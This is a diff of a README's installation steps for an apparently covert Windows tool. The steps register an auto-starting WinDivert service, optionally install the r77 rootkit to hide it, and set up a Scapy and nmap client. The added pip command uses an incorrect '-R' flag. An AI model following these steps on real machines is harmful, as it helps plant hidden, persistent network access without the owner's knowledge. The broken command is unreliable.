@@ -31,13 +31,15 @@ This project is compatible with Win7, Win8, Win10, WS2012, and WS2016
 `sc create WinDivertService binPath= "C:\path\to\main.exe" start= auto`
 5. Start service </br>
 `sc start WinDivertService`
-6. Install [rootkit](https://github.com/bytecode77/r77-rootkit) </br>
+6. (Optional) Install [rootkit](https://github.com/bytecode77/r77-rootkit) </br>
 `Install.exe`
 ### Client
-1. Install python
-2. [Install Scapy](https://scapy.readthedocs.io/en/latest/installation.html)
+1. Install python and pip
+2. Install [nmap](https://nmap.org/download#windows)
 3. Download client.py script
-4. Flourish
+4. Install requirements with [the official docs](https://scapy.readthedocs.io/en/latest/installation.html) or with this command: </br>
+`pip install -R requirements.txt` </br>
+5. Flourish
 
 ## References
 | Link to Project                                                                  | Code Used?      | License                                                                                              |
